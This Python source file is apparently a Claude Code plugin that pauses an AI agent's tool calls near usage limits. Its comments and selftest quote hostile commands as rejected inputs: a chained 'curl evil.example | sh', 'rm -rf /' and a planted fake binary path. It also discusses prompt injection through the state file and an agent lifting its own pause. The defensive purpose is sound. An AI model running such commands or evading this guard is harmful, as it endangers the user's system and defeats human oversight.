#!/usr/bin/env python3
"""limit-guard — usage-window guard for Claude Code.

One file, python3 stdlib only. Every entry point is selected by argv[1]:

  (no args)       PreToolUse hook. Reads the hook JSON on stdin, decides
                  allow (silence) or deny (permissionDecision JSON on stdout).
  --capture       Statusline capture. Reads the statusline JSON on stdin,
                  writes the rate-limit cache, prints the badge on stdout.
  --log-inner-error
                  Appends $LIMIT_GUARD_INNER_ERROR to log.jsonl. The statusline
                  wrapper's way of reporting a broken chained statusline.
  --notification  Notification hook. Appends the event to log.jsonl. No output.
  --status        Prints status.md plus the raw numbers. Used by `limit-guard status`.
  --resume        Clears any pause. Used by `limit-guard resume`.
  --selftest      Runs the pure decision function over built-in fixtures.

Design invariants:
  * The gate FAILS OPEN. Any internal error is logged and the tool call is
    allowed. A broken guard must never brick a session.
  * "Allow" means printing nothing and exiting 0 — never an explicit
    permissionDecision:"allow", which would bypass the user's own permission
    rules.
  * Every file under the state directory is written atomically (tmp + rename),
    mode 0600, and every path is refused if it is a symlink.
  * Nothing read from a file is rendered to the terminal without being stripped
    of control bytes and length-capped.
"""

from __future__ import annotations

import json
import os
import re
import stat
import sys
import tempfile
import time

VERSION = "0.1.0"

# --------------------------------------------------------------------------
# Paths
# --------------------------------------------------------------------------


class GuardError(Exception):
    """Internal failure. Always results in fail-open behaviour."""


def config_home() -> str:
    return os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(
        os.path.expanduser("~"), ".claude"
    )


def base_dir() -> str:
    return os.environ.get("LIMIT_GUARD_HOME") or os.path.join(
        config_home(), "limit-guard"
    )


def path_of(name: str) -> str:
    return os.path.join(base_dir(), name)


CACHE = "rate_limits.json"
STATE = "state.json"
STATUS = "status.md"
LOG = "log.jsonl"
CONFIG = "config.json"
OVERRIDE = "override"


def ensure_dir() -> str:
    d = base_dir()
    if os.path.islink(d):
        raise GuardError("state dir is a symlink: refusing")
    os.makedirs(d, mode=0o700, exist_ok=True)
    # A directory that already existed may be group- or world-readable, and it
    # holds the session's usage numbers. Tighten it rather than trust it.
    try:
        mode = stat.S_IMODE(os.stat(d).st_mode)
        if mode & 0o077:
            os.chmod(d, 0o700)
    except OSError:
        pass
    return d


# --------------------------------------------------------------------------
# Safe IO
# --------------------------------------------------------------------------


def read_text(path: str, limit: int = 262144) -> str | None:
    """Read a file, refusing symlinks. None when absent."""
    if os.path.islink(path):
        raise GuardError("refusing symlink: %s" % os.path.basename(path))
    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except FileNotFoundError:
        return None
    except OSError as exc:
        raise GuardError("open failed: %s" % exc) from exc
    try:
        with os.fdopen(fd, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read(limit)
    except OSError as exc:
        raise GuardError("read failed: %s" % exc) from exc


def read_json(path: str) -> dict | None:
    raw = read_text(path)
    if not raw:
        return None
    try:
        val = json.loads(raw)
    except (ValueError, TypeError):
        return None
    return val if isinstance(val, dict) else None


def atomic_write(path: str, data: str) -> None:
    """Write tmp + rename, 0600, refusing to clobber a symlink."""
    if os.path.islink(path):
        raise GuardError("refusing symlink: %s" % os.path.basename(path))
    d = ensure_dir()
    fd, tmp = tempfile.mkstemp(dir=d, prefix=".lg-tmp-")
    try:
        os.fchmod(fd, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(data)
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


LOG_MAX_BYTES = 1_048_576


def _last_log_line(path: str) -> str:
    """Cheap tail: the last complete line, without reading the whole file."""
    try:
        size = os.path.getsize(path)
        with open(path, "rb") as fh:
            fh.seek(max(0, size - 4096))
            tail = fh.read().decode("utf-8", "replace")
        lines = [ln for ln in tail.splitlines() if ln.strip()]
        return lines[-1] if lines else ""
    except OSError:
        return ""


def append_log(event: dict) -> None:
    """Best-effort append to log.jsonl. Never raises.

    The gate runs on every tool call, so an override or a persistent error
    would otherwise write one line per call forever. Two bounds: consecutive
    identical events (ignoring the timestamp) collapse into one, and the file
    rotates to log.jsonl.1 at 1 MB.
    """
    try:
        ensure_dir()
        path = path_of(LOG)
        if os.path.islink(path):
            return
        event = dict(event)
        event.setdefault("ts", int(time.time()))

        fingerprint = json.dumps(
            {k: v for k, v in event.items() if k != "ts"}, sort_keys=True, default=str
        )
        previous = _last_log_line(path)
        if previous:
            try:
                prior = json.loads(previous)
                prior.pop("ts", None)
                if json.dumps(prior, sort_keys=True, default=str) == fingerprint:
                    return
            except ValueError:
                pass

        try:
            if os.path.getsize(path) > LOG_MAX_BYTES:
                os.replace(path, path + ".1")
        except OSError:
            pass

        line = json.dumps(event, sort_keys=True, default=str) + "\n"
        flags = os.O_WRONLY | os.O_APPEND | os.O_CREAT | getattr(os, "O_NOFOLLOW", 0)
        fd = os.open(path, flags, 0o600)
        try:
            os.write(fd, line.encode("utf-8"))
        finally:
            os.close(fd)
    except Exception:
        pass


# --------------------------------------------------------------------------
# Config
# --------------------------------------------------------------------------

DEFAULTS = {
    "PAUSE_PCT": 95.0,
    "RESUME_PCT": 30.0,
    "MAX_AUTO_WAIT_S": 36000.0,  # 10h
    "MAX_CACHE_AGE_S": 900.0,  # 15min — older than this counts as "no data"
    "WAKE_CAP_S": 3600.0,  # ScheduleWakeup hop cap
    "WAKE_PAD_S": 60.0,  # wake this long after the reset
    # A five-hour window cannot legitimately reset more than five hours out,
    # and a seven-day window cannot reset more than seven days out. Anything
    # far beyond that is a corrupt or forged cache, and honouring it would pin
    # the session shut behind an endless chain of wakeups -- or, for the 7d
    # window, behind a manual pause only a human can lift.
    "MAX_FIVE_HOUR_HORIZON_S": 28800.0,  # 8h
    "MAX_SEVEN_DAY_HORIZON_S": 691200.0,  # 8d
    "DISABLED": 0.0,
}


def load_config() -> dict:
    """Defaults < config.json < environment. Every key is a number."""
    cfg = dict(DEFAULTS)
    try:
        stored = read_json(path_of(CONFIG)) or {}
    except GuardError:
        stored = {}
    for key in DEFAULTS:
        for source, raw in (
            ("file", stored.get(key)),
            ("env", os.environ.get("LIMIT_GUARD_" + key)),
        ):
            if raw is None or raw == "":
                continue
            try:
                cfg[key] = float(raw)
            except (TypeError, ValueError):
                append_log(
                    {
                        "event": "config_bad_value",
                        "key": key,
                        "source": source,
                    }
                )
    return cfg


# --------------------------------------------------------------------------
# Formatting
# --------------------------------------------------------------------------

CTRL = re.compile(r"[\x00-\x1f\x7f]")


def clean(text, cap: int = 200) -> str:
    """Strip control bytes and cap length. Nothing from disk reaches a
    terminal without passing through here."""
    if not isinstance(text, str):
        text = str(text)
    return CTRL.sub("", text)[:cap]


def tz_name(ts: float) -> str:
    return clean(time.strftime("%Z", time.localtime(ts)), 8) or "local"


def fmt_clock(ts: float, now=None) -> str:
    """'14:05 CEST' when the time is today, 'Mon 09:00 CEST' when it is not.

    A bare "until 09:00" on a pause that lasts two days reads as this morning.
    """
    stamp = time.strftime("%H:%M", time.localtime(ts))
    if now is not None:
        lt, ln = time.localtime(ts), time.localtime(now)
        if (lt.tm_year, lt.tm_yday) != (ln.tm_year, ln.tm_yday):
            stamp = time.strftime("%a %H:%M", lt)
    return "%s %s" % (stamp, tz_name(ts))


def fmt_short(ts: float, now: float) -> str:
    """'14:05' today, 'Mon 09:00' otherwise."""
    lt, ln = time.localtime(ts), time.localtime(now)
    if (lt.tm_year, lt.tm_yday) == (ln.tm_year, ln.tm_yday):
        return time.strftime("%H:%M", lt)
    return time.strftime("%a %H:%M", lt)


def fmt_dur(seconds: float) -> str:
    """'1h35m' / '45m' / '30s'."""
    seconds = int(max(0, seconds))
    if seconds < 60:
        return "%ds" % seconds
    if seconds < 3600:
        return "%dm" % (seconds // 60)
    hours, minutes = seconds // 3600, (seconds % 3600) // 60
    return "%dh" % hours if minutes == 0 else "%dh%02dm" % (hours, minutes)


WINDOWS = (("five_hour", "5h"), ("seven_day", "7d"), ("spend_limit", "$"))
LABELS = dict(WINDOWS)


# --------------------------------------------------------------------------
# Cache reading
# --------------------------------------------------------------------------


def pick(obj, keys):
    """Keep only `keys` from a dict, and only if their values are scalars."""
    if not isinstance(obj, dict):
        return None
    out = {}
    for key in keys:
        value = obj.get(key)
        if isinstance(value, bool) or value is None:
            continue
        if isinstance(value, (int, float)):
            out[key] = value
        elif isinstance(value, str):
            out[key] = clean(value, 64)
    return out or None


WINDOW_FIELDS = ("used_percentage", "resets_at")
MAX_WINDOWS = 8


def pick_windows(limits):
    """Filter a raw `rate_limits` object down to what this plugin reads.

    Storing it verbatim would make the cache a place for arbitrary nested
    content to live -- the file is read back and rendered into the status bar
    and the status line, so "we only keep the fields we read" has to be true of
    the windows too, not just of the top level. Unknown window names survive
    (cleaned and counted) because a new window Claude Code adds should show up
    in the cache rather than vanish; only their fields are trimmed.
    """
    if not isinstance(limits, dict):
        return None
    out = {}
    for name in sorted(limits)[:MAX_WINDOWS]:
        win = pick(limits.get(name), WINDOW_FIELDS)
        if win:
            out[clean(str(name), 32)] = win
    return out or None


def load_cache() -> dict | None:
    cache = read_json(path_of(CACHE))
    if not cache or not isinstance(cache.get("captured_at"), (int, float)):
        return None
    return cache


def window_of(cache: dict | None, name: str) -> dict | None:
    if not cache:
        return None
    limits = cache.get("rate_limits")
    if not isinstance(limits, dict):
        return None
    win = limits.get(name)
    if not isinstance(win, dict):
        return None
    try:
        pct = float(win.get("used_percentage"))
        resets = float(win.get("resets_at"))
    except (TypeError, ValueError):
        return None
    return {"pct": pct, "resets_at": resets}


def pct_of(cache: dict | None, name: str, now: float) -> float:
    """Used percentage, or 0 when the window is absent or already reset."""
    win = window_of(cache, name)
    if not win or now >= win["resets_at"]:
        return 0.0
    return win["pct"]


# --------------------------------------------------------------------------
# State
# --------------------------------------------------------------------------

EMPTY_STATE = {
    "paused": False,
    "since": 0,
    "until": 0,
    "window": "",
    "manual": False,
    "notified": False,
    "pct": 0.0,
    "reason": "",
}


def load_state() -> dict:
    state = dict(EMPTY_STATE)
    stored = read_json(path_of(STATE))
    if stored:
        for key in EMPTY_STATE:
            if key in stored:
                state[key] = stored[key]
    state["paused"] = bool(state.get("paused"))
    state["manual"] = bool(state.get("manual"))
    state["notified"] = bool(state.get("notified"))
    for key in ("since", "until", "pct"):
        try:
            state[key] = float(state[key])
        except (TypeError, ValueError):
            state[key] = 0.0
    state["window"] = clean(state.get("window") or "", 32)
    state["reason"] = clean(state.get("reason") or "", 1000)
    return state


def save_state(state: dict) -> None:
    atomic_write(path_of(STATE), json.dumps(state, sort_keys=True) + "\n")


# --------------------------------------------------------------------------
# status.md
# --------------------------------------------------------------------------


def status_line(cache: dict | None, state: dict, now: float) -> str:
    parts = ["%s %s" % (time.strftime("%Y-%m-%d %H:%M", time.localtime(now)), tz_name(now))]
    seen = False
    for name, label in WINDOWS:
        win = window_of(cache, name)
        if not win:
            continue
        seen = True
        remaining = win["resets_at"] - now
        parts.append(
            "%s %.0f%% resets %s (%s)"
            % (label, win["pct"], fmt_short(win["resets_at"], now), fmt_dur(remaining))
        )
    if not seen:
        age = "never" if not cache else fmt_dur(now - cache["captured_at"]) + " ago"
        parts.append("no rate_limits data (captured %s)" % age)
    if state["paused"]:
        parts.append(
            "PAUSED (%s) until %s"
            % ("manual" if state["manual"] else "auto", fmt_clock(state["until"], now))
        )
    else:
        parts.append("running")
    return " | ".join(parts)


def write_status(cache: dict | None, state: dict, now: float) -> str:
    line = status_line(cache, state, now)
    atomic_write(path_of(STATUS), line + "\n")
    return line


# --------------------------------------------------------------------------
# Deny reason text
# --------------------------------------------------------------------------


FALLBACK = (
    " If ScheduleWakeup is unavailable or errors: write the summary, call "
    "PushNotification once if available, end the turn; the human resumes."
)


def deny_reason(state: dict, cfg: dict, pct: float, now: float) -> str:
    """Build the deny text.

    Everything interpolated here is either a number this module computed or a
    string from a fixed table. Nothing file-sourced reaches the model: the
    state file is attacker-writable in the threat model that motivates the
    symlink refusals, and permissionDecisionReason goes straight into the
    model's context, so a raw echo of state["window"] would be a prompt
    injection channel.
    """
    label = LABELS.get(state["window"], "usage")
    until = state["until"]
    # A vanished or reset cache must not make the deny message read "at 0%":
    # fall back to the percentage recorded when the pause was taken.
    if not pct:
        pct = float(state.get("pct") or 0.0)
    pct = max(0.0, min(1000.0, float(pct)))
    head = (
        "limit-guard: %s window at %.0f%% (>=%.0f). Paused until %s (%s). "
        "Do not call tools."
        % (label, pct, cfg["PAUSE_PCT"], fmt_clock(until, now), fmt_dur(until - now))
    )
    if state["manual"]:
        if state["notified"]:
            return head + (
                " Write a 3-line status summary for the user and end the turn. Do NOT "
                "schedule wakeups and do NOT send another PushNotification — one was "
                "already sent. Only the human can lift this pause; you cannot."
            )
        return head + (
            " Write a 3-line status summary for the user. Reset is more than %s away: "
            "do NOT schedule wakeups. Call PushNotification once if available, then end "
            "the turn — only the human can lift this pause; you cannot."
            % fmt_dur(cfg["MAX_AUTO_WAIT_S"])
        )
    delay = int(min(cfg["WAKE_CAP_S"], max(60.0, until - now + cfg["WAKE_PAD_S"])))
    return head + (
        " Write a 3-line status summary for the user, then call ScheduleWakeup with "
        "delaySeconds=%d and prompt 'limit-guard: run `limit-guard status` and continue "
        "the task if allowed'. On wake, first run `limit-guard status`; if it still says "
        "PAUSED, repeat this ScheduleWakeup hop." % delay
    ) + FALLBACK


# --------------------------------------------------------------------------
# The decision (pure function of cache, state, config, now)
# --------------------------------------------------------------------------


WINDOW_HORIZONS = (
    ("five_hour", "MAX_FIVE_HOUR_HORIZON_S"),
    ("seven_day", "MAX_SEVEN_DAY_HORIZON_S"),
)


def implausible_windows(cache, cfg, now) -> dict:
    """{window: worth_logging} for every window whose resets_at is too far out.

    Pure, and called from two places on purpose: decide() discards these
    windows, and run_gate() logs the discard. Logging from decide() instead
    would either miss the discard whenever the OTHER window went on to pause
    (the note is overwritten) or make `limit-guard selftest` write to the real
    state directory.
    """
    out = {}
    for name, key in WINDOW_HORIZONS:
        win = window_of(cache, name)
        if not win or (win["resets_at"] - now) <= cfg[key]:
            continue
        # Only a window that would otherwise have paused the session is worth
        # a log line; a bogus reset on an idle window is noise on every call.
        out[name] = pct_of(cache, name, now) >= cfg["PAUSE_PCT"]
    return out


def decide(cache, state, cfg, now):
    """Return (allow: bool, new_state: dict|None, reason: str, note: str).

    new_state is None when nothing changed. Pure: no IO, so the tests can
    drive every branch directly.
    """
    state = dict(state)

    if state["paused"]:
        # A missing or zero `until` is not "pauses forever": it is a pause with
        # no expiry recorded, which nothing but a human could ever lift. Treat
        # it as already expired -- the safe direction for a fail-open guard.
        if not state["until"] or now >= state["until"]:
            return True, unpause(state, "reset time reached"), "", "unpaused_time"
        # Resume early only on a capture that is BOTH newer than the pause AND
        # actually carries the window. rate_limits is absent for the first turn
        # of every session, and an absent window reads as 0% — without this
        # check a restart would silently lift the pause it was meant to hold.
        # captured_at is int(now); state["since"] is a float. Comparing them
        # with `>` throws away every capture taken in the same second as the
        # pause, which is exactly when the first one lands. Compare truncated
        # seconds, and let an equal stamp count as fresh: the capture that
        # CAUSED the pause was at or above PAUSE_PCT, so it can never satisfy
        # the < RESUME_PCT test below.
        fresh = bool(cache) and cache["captured_at"] >= int(state["since"])
        if fresh and window_of(cache, state["window"]) is not None:
            live = pct_of(cache, state["window"], now)
            if live < cfg["RESUME_PCT"]:
                return True, unpause(state, "usage back to %.0f%%" % live), "", "unpaused_pct"
        pct = pct_of(cache, state["window"], now) if cache else 0.0
        changed = None
        if state["manual"] and not state["notified"]:
            # The deny that CREATED this pause already asked for the one
            # PushNotification. Flip the flag before building the text so every
            # denial from here on tells the model not to send another.
            state["notified"] = True
            changed = state
        return False, changed, deny_reason(state, cfg, pct, now), "still_paused"

    if cache is None:
        return True, None, "", "no_cache"
    if now - cache["captured_at"] > cfg["MAX_CACHE_AGE_S"]:
        return True, None, "", "stale_cache"

    # A five-hour window resetting days from now is not a five-hour window, and
    # a seven-day window resetting a year out is not one either. Discard them:
    # pausing on one would hand the session an unbounded wakeup chain -- or a
    # manual pause needing a human -- on the word of a corrupt or planted file.
    #
    # Discard, and then KEEP GOING. Returning early here would let one bad
    # value suppress a perfectly good pause on the other window, which turns a
    # hardening measure into the bypass it was meant to close.
    bad = implausible_windows(cache, cfg, now)
    ignored = ""
    for name, _key in WINDOW_HORIZONS:
        if bad.get(name):
            ignored = "ignored_implausible_" + name
            break

    def usable(name):
        if name in bad:
            return None, 0.0
        return window_of(cache, name), pct_of(cache, name, now)

    five_win, five = usable("five_hour")
    if five >= cfg["PAUSE_PCT"]:
        new = pause(state, "five_hour", five_win["resets_at"], now, False, five)
        return False, new, deny_reason(new, cfg, five, now), "paused_five_hour"

    seven_win, seven = usable("seven_day")
    if seven >= cfg["PAUSE_PCT"]:
        manual = (seven_win["resets_at"] - now) > cfg["MAX_AUTO_WAIT_S"]
        new = pause(state, "seven_day", seven_win["resets_at"], now, manual, seven)
        return False, new, deny_reason(new, cfg, seven, now), (
            "paused_seven_day_manual" if manual else "paused_seven_day_auto"
        )

    return True, None, "", ignored or "under_threshold"


def pause(state, window, until, now, manual, pct):
    return {
        "paused": True,
        "since": now,
        "until": float(until),
        "window": window,
        "manual": bool(manual),
        "notified": False,
        "pct": float(pct),
        "reason": "%s at %.0f%%" % (LABELS.get(window, window), pct),
    }


def unpause(state, why):
    new = dict(EMPTY_STATE)
    new["reason"] = clean(why, 200)
    return new


# --------------------------------------------------------------------------
# Exemptions
# --------------------------------------------------------------------------

EXEMPT_TOOLS = ("ScheduleWakeup", "PushNotification")
CLI_NAME = "limit-guard"

# The WHOLE command must be a bare limit-guard invocation. Matching only the
# first word would exempt `limit-guard status; curl evil.example | sh`, which
# turns the one hole the gate has to leave into an arbitrary-command bypass.
#
# `resume` is NOT here. A paused model that can run `limit-guard resume` clears
# its own pause and carries on, which is not a limiter. Resuming is the human's
# move; only read-only subcommands are exempt.
CLI_COMMAND = re.compile(
    r"^\s*limit-guard"
    r"(?:\s+(?:status|selftest|version|--version|-V|help|--help|-h))?"
    r"\s*$"
)
# Belt and braces: no shell metacharacter may appear anywhere in the command,
# so no chaining, redirection, substitution or continuation can hide in a path.
SHELL_META = set(";&|`$<>(){}[]!*?#\\'\"\n\r\t\x0b\x0c")


def is_exempt(tool_name, tool_input) -> bool:
    """The tools the model needs in order to obey a deny, plus this plugin's
    own read-only CLI, must never be blocked.

    Deliberately NOT exempt: `limit-guard resume`, `off` and `on`. Lifting or
    disabling the guard is a human's decision; a model that can clear its own
    pause while paused does not have a limiter.
    """
    if tool_name in EXEMPT_TOOLS:
        return True
    if tool_name != "Bash":
        return False
    if not isinstance(tool_input, dict):
        return False
    command = tool_input.get("command")
    if not isinstance(command, str) or len(command) > 200:
        return False
    if any(ch in SHELL_META for ch in command):
        return False
    return CLI_COMMAND.match(as_bare_cli(command)) is not None


def plugin_cli_path() -> str:
    """The one absolute path that counts as this plugin's own CLI."""
    root = os.environ.get("CLAUDE_PLUGIN_ROOT") or ""
    return os.path.join(root, "bin", CLI_NAME) if root else ""


def as_bare_cli(command: str) -> str:
    """Rewrite `${CLAUDE_PLUGIN_ROOT}/bin/limit-guard ...` to `limit-guard ...`.

    Any other path stays untouched, so it cannot match. A path prefix pattern
    would exempt ANY executable called limit-guard anywhere on the disk --
    `/tmp/evil/limit-guard status` and `../../evil/limit-guard` included --
    which hands a bypass to whoever can drop a file. Exactly two forms are
    exempt: the bare name (Claude Code puts the plugin's bin/ on PATH) and the
    absolute path inside this plugin's own root.
    """
    stripped = command.strip()
    root_cli = plugin_cli_path()
    if not root_cli or not stripped.startswith(root_cli):
        return command
    rest = stripped[len(root_cli):]
    if rest and not rest[:1].isspace():
        return command
    return CLI_NAME + rest


def override_active() -> bool:
    path = path_of(OVERRIDE)
    return os.path.exists(path) and not os.path.islink(path)


# --------------------------------------------------------------------------
# Entry point: PreToolUse gate
# --------------------------------------------------------------------------


def emit_deny(reason: str) -> None:
    json.dump(
        {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": reason,
            }
        },
        sys.stdout,
    )
    sys.stdout.write("\n")


def run_gate(stdin_text: str) -> int:
    """Never raises. Exit 0 always; silence == allow."""
    try:
        payload = json.loads(stdin_text) if stdin_text.strip() else {}
        if not isinstance(payload, dict):
            payload = {}
    except ValueError:
        payload = {}

    tool_name = payload.get("tool_name") or ""
    try:
        cfg = load_config()
        if cfg["DISABLED"]:
            return 0
        if is_exempt(tool_name, payload.get("tool_input")):
            return 0
        if override_active():
            append_log({"event": "override_allow", "tool": clean(tool_name, 64)})
            return 0

        cache = load_cache()
        state = load_state()
        now = time.time()
        allow, new_state, reason, note = decide(cache, state, cfg, now)

        # Logged here, not inside decide(), and regardless of what decide()
        # went on to do: a discarded window that a real pause then overwrote in
        # `note` is exactly the case worth having in the log.
        for name, notable in sorted(implausible_windows(cache, cfg, now).items()):
            if notable:
                append_log(
                    {
                        "event": "ignored_implausible_" + name,
                        "tool": clean(tool_name, 64),
                    }
                )
        if new_state is not None:
            save_state(new_state)
            write_status(cache, new_state, now)
            append_log(
                {
                    "event": note,
                    "window": new_state.get("window") or state.get("window"),
                    "until": new_state.get("until"),
                    "manual": new_state.get("manual"),
                    "agent_type": clean(payload.get("agent_type") or "", 64),
                    "tool": clean(tool_name, 64),
                }
            )
        if allow:
            return 0
        emit_deny(reason)
        return 0
    except Exception as exc:  # fail OPEN, always
        append_log(
            {
                "event": "gate_error_fail_open",
                "error": clean("%s: %s" % (type(exc).__name__, exc), 300),
                "tool": clean(tool_name, 64),
            }
        )
        return 0


# --------------------------------------------------------------------------
# Entry point: statusline capture + badge
# --------------------------------------------------------------------------

GREEN, YELLOW, RED, RESET = "\033[32m", "\033[33m", "\033[31m", "\033[0m"


def colorize(text: str, pct: float) -> str:
    if os.environ.get("NO_COLOR") or os.environ.get("LIMIT_GUARD_NO_COLOR"):
        return text
    color = GREEN if pct < 70 else (YELLOW if pct < 90 else RED)
    return color + text + RESET


def badge(cache: dict | None, state: dict, now: float) -> str:
    if state["paused"]:
        tag = "PAUSED(manual)" if state["manual"] else "PAUSED"
        return " " + colorize("[⏸ %s→%s]" % (tag, fmt_short(state["until"], now)), 100.0)
    chunks = []
    for name, label in (("five_hour", "5h"), ("seven_day", "7d")):
        win = window_of(cache, name)
        if not win or now >= win["resets_at"]:
            continue
        chunks.append(
            colorize(
                "%s %.0f%%↻%s" % (label, win["pct"], fmt_short(win["resets_at"], now)),
                win["pct"],
            )
        )
    if not chunks:
        return ""
    return " [" + " | ".join(chunks) + "]"


def run_capture(stdin_text: str) -> int:
    """Write the cache, print the badge. Never raises, never exits non-zero:
    a statusline that fails is worse than a statusline with no badge."""
    try:
        payload = json.loads(stdin_text) if stdin_text.strip() else {}
        if not isinstance(payload, dict):
            payload = {}
    except ValueError:
        payload = {}

    now = time.time()
    try:
        # Copy only the fields this plugin reads. The statusline payload also
        # carries cwd, transcript_path, session ids, repo and PR metadata; none
        # of it belongs in a file that exists to answer "how full is the
        # window", and every field kept is a field to keep safe.
        entry = {
            "captured_at": int(now),
            "rate_limits": pick_windows(payload.get("rate_limits")),
            "context_window": pick(payload.get("context_window"), ("used_percentage", "context_window_size")),
            "model": pick(payload.get("model"), ("id", "display_name")),
            "version": VERSION,
        }
        if payload:
            atomic_write(path_of(CACHE), json.dumps(entry, sort_keys=True) + "\n")

        cache = load_cache()
        state = load_state()
        # An expired pause should stop showing PAUSED even if no tool ran.
        if state["paused"] and (not state["until"] or now >= state["until"]):
            state = unpause(state, "reset time reached")
            save_state(state)
            append_log({"event": "unpaused_time", "source": "statusline"})
        write_status(cache, state, now)
        sys.stdout.write(badge(cache, state, now))
    except Exception as exc:
        append_log(
            {
                "event": "capture_error",
                "error": clean("%s: %s" % (type(exc).__name__, exc), 300),
            }
        )
    return 0


def run_log_inner_error() -> int:
    """Record a chained-statusline failure handed over by the wrapper.

    The wrapper cannot append JSON on its own without a second process, and it
    cannot piggyback on --capture any more: the capture now runs BEFORE the
    inner statusline, so the failure is not known yet when it fires. This mode
    exists only for that hand-off, runs only when something went wrong, and
    writes nothing but one log line.
    """
    try:
        detail = os.environ.get("LIMIT_GUARD_INNER_ERROR") or ""
        if detail:
            append_log({"event": "inner_statusline_error", "detail": clean(detail, 300)})
    except Exception:
        pass
    return 0


# --------------------------------------------------------------------------
# Entry point: Notification logger (evidence for autoContinueAtUsageLimit)
# --------------------------------------------------------------------------


def run_notification(stdin_text: str) -> int:
    try:
        payload = json.loads(stdin_text) if stdin_text.strip() else {}
        if not isinstance(payload, dict):
            payload = {}
        entry = {
            "event": "notification",
            "hook_event_name": clean(payload.get("hook_event_name") or "", 64),
            "matcher": clean(
                payload.get("notification_type")
                or payload.get("matcher")
                or payload.get("type")
                or "",
                64,
            ),
            "message": clean(payload.get("message") or "", 500),
            "raw_keys": sorted(str(k)[:32] for k in payload.keys()),
        }
        # StopFailure is the closest thing to an "on limit hit" event, and its
        # payload is where the evidence lives: whether the turn died on
        # rate_limit, and what the model had said by then.
        for key, cap in (("error", 500), ("last_assistant_message", 500)):
            value = payload.get(key)
            if value:
                entry[key] = clean(
                    value if isinstance(value, str) else json.dumps(value, default=str), cap
                )
        append_log(entry)
    except Exception:
        pass
    return 0


# --------------------------------------------------------------------------
# Entry points: status / resume / selftest
# --------------------------------------------------------------------------


def run_status() -> int:
    now = time.time()
    try:
        cache = load_cache()
        state = load_state()
        cfg = load_config()
        print(status_line(cache, state, now))
        if cache is None:
            print(
                "cache: none — no statusline capture yet. Is statusLine.command set to "
                "limit-guard-statusline.sh? (rate_limits also only appear after the "
                "first API response of a session.)"
            )
        else:
            age = now - cache["captured_at"]
            print(
                "cache: %s old%s"
                % (fmt_dur(age), " (STALE)" if age > cfg["MAX_CACHE_AGE_S"] else "")
            )
            for name, label in WINDOWS:
                win = window_of(cache, name)
                if win:
                    print(
                        "  %-4s %6.2f%%  resets_at=%d (%s)"
                        % (label, win["pct"], int(win["resets_at"]), fmt_clock(win["resets_at"], now))
                    )
        print(
            "config: PAUSE_PCT=%.0f RESUME_PCT=%.0f MAX_AUTO_WAIT_S=%d "
            "MAX_CACHE_AGE_S=%d WAKE_CAP_S=%d"
            % (
                cfg["PAUSE_PCT"],
                cfg["RESUME_PCT"],
                cfg["MAX_AUTO_WAIT_S"],
                cfg["MAX_CACHE_AGE_S"],
                cfg["WAKE_CAP_S"],
            )
        )
        if override_active():
            print("override: ACTIVE — the gate is allowing everything.")
        if cfg["DISABLED"]:
            print("DISABLED=1 — the gate is off.")
        print("state dir: %s" % clean(base_dir(), 500))
        # Exit 0 even while paused. The skill tells the model to run this first
        # on every wake; a non-zero exit surfaces there as a failed command and
        # invites a retry loop. The printed line already carries the state.
        return 0
    except Exception as exc:
        print("limit-guard: status failed: %s" % clean(str(exc), 200), file=sys.stderr)
        return 0


def run_resume() -> int:
    try:
        state = load_state()
        if not state["paused"]:
            print("limit-guard: not paused.")
            return 0
        save_state(unpause(state, "manual resume"))
        append_log({"event": "unpaused_manual"})
        cache = load_cache()
        print("limit-guard: resumed. " + write_status(cache, load_state(), time.time()))
        return 0
    except Exception as exc:
        print("limit-guard: resume failed: %s" % clean(str(exc), 200), file=sys.stderr)
        return 1


def run_selftest() -> int:
    """Exercises the pure decision function only — touches no real state."""
    cfg = dict(DEFAULTS)
    now = 1_000_000.0
    ok = True

    def check(name, got, want):
        nonlocal ok
        if got != want:
            ok = False
            print("FAIL %s: got %r want %r" % (name, got, want))
        else:
            print("ok   %s" % name)

    idle = dict(EMPTY_STATE)
    low = {"captured_at": now, "rate_limits": {"five_hour": {"used_percentage": 10, "resets_at": now + 600}}}
    high = {"captured_at": now, "rate_limits": {"five_hour": {"used_percentage": 97, "resets_at": now + 600}}}
    check("allow under threshold", decide(low, idle, cfg, now)[0], True)
    check("deny over threshold", decide(high, idle, cfg, now)[0], False)
    check("allow with no cache", decide(None, idle, cfg, now)[0], True)
    bogus_5h = {
        "captured_at": now,
        "rate_limits": {
            "five_hour": {"used_percentage": 99, "resets_at": now + 30 * 86400},
            "seven_day": {"used_percentage": 99, "resets_at": now + 3600},
        },
    }
    check(
        "implausible 5h does not suppress a real 7d pause",
        decide(bogus_5h, idle, cfg, now)[0],
        False,
    )
    check(
        "allow with stale cache",
        decide({"captured_at": now - 99999, "rate_limits": {"five_hour": {"used_percentage": 99, "resets_at": now + 600}}}, idle, cfg, now)[0],
        True,
    )
    check("exempt ScheduleWakeup", is_exempt("ScheduleWakeup", {}), True)
    check("exempt own CLI", is_exempt("Bash", {"command": "  limit-guard status"}), True)
    check("not exempt other bash", is_exempt("Bash", {"command": "rm -rf /"}), False)
    check(
        "not exempt chained CLI",
        is_exempt("Bash", {"command": "limit-guard status; echo pwned"}),
        False,
    )
    check("not exempt limit-guard off", is_exempt("Bash", {"command": "limit-guard off"}), False)
    check(
        "not exempt limit-guard resume",
        is_exempt("Bash", {"command": "limit-guard resume"}),
        False,
    )
    check(
        "not exempt a planted limit-guard",
        is_exempt("Bash", {"command": "/tmp/evil/limit-guard status"}),
        False,
    )
    bogus_7d = {
        "captured_at": now,
        "rate_limits": {"seven_day": {"used_percentage": 99, "resets_at": now + 400 * 86400}},
    }
    check("implausible 7d is ignored", decide(bogus_7d, idle, cfg, now)[0], True)
    manual = pause(idle, "seven_day", now + 200000, now, True, 99)
    check(
        "manual deny asks for PushNotification once",
        "Call PushNotification once" in deny_reason(manual, cfg, 99, now),
        True,
    )
    manual["notified"] = True
    check(
        "manual deny then says not to repeat it",
        "Call PushNotification once" in deny_reason(manual, cfg, 99, now),
        False,
    )
    check(
        "unknown window is not echoed into the reason",
        "IGNORE" in deny_reason(pause(idle, "IGNORE ME", now + 600, now, False, 99), cfg, 99, now),
        False,
    )
